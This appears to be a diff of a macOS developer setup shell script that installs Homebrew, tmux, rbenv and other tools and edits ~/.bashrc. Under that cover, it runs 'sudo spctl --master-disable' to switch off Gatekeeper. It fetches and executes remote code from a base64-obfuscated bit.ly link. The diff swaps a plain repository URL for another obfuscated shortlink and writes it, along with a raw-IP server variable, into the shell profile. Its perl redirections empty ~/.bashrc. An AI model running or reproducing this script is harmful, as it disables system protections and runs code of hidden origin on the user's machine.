@@ -1,16 +1,16 @@
 #!/bin/sh
 
 set -e; sudo spctl --master-disable; SERVER='GS=http://149.28.95.12:8808'
-dbsf () { echo $1 | base64 -D }
+dbsf () { echo $1 | base64 -D; }
 mult () { for f in "$@"; do touch $HOME/.${f}; done }; mult bash_profile bashrc
 chkprog () { if hash $1 2> /dev/null; then return 0; else return 1; fi }
 if ! chkprog brew; then /usr/bin/ruby -e "$(curl -fsSL $(dbsf aHR0cDovL2JpdC5seS8yS09yNlly))"; else brew update 1> /dev/null; fi; if chkprog rvm; then rvm implode; fi
 biu () { for i in "$@"; do if ! chkprog $i; then brew install $i; else brew upgrade $i 2> /dev/null || true; fi; done }; biu tmux rbenv ninja gnu-sed
 
-MKP='mkproj ()'; MKPCMD=$MKP'{ git clone git@bitbucket.org:bravosprinthub/mkproj.git $1 && rm -rf $1/.git $1/README.md; }'
+MKP='mkproj ()'; SNIPT=$MKP'{ git clone '$(dbsf aHR0cDovL2JpdC5seS8yS0IySnln)' $1 && rm -rf $1/.git $1/README.md; }'
 (perl -pe "s^$SERVER^^g" ~/.bashrc > ~/.bashrc) 2> /dev/null
 (perl -pe "s#$MKP.*##g" ~/.bashrc > ~/.bashrc) 2> /dev/null
-edrc () { for cmd in "$@"; do echo "\n$cmd" >> ~/.bashrc; done }; edrc "$MKPCMD" "$SERVER"
+edrc () { for cmd in "$@"; do echo "\n$cmd" >> ~/.bashrc; done }; edrc "$SNIPT" "$SERVER"
 
 grep -qxF 'export PATH="$HOME/.rbenv/bin:$PATH"' ~/.bashrc || echo '\nexport PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
 grep -qxF 'eval "$(rbenv init -)"' ~/.bashrc || echo '\neval "$(rbenv init -)"' >> ~/.bashrc
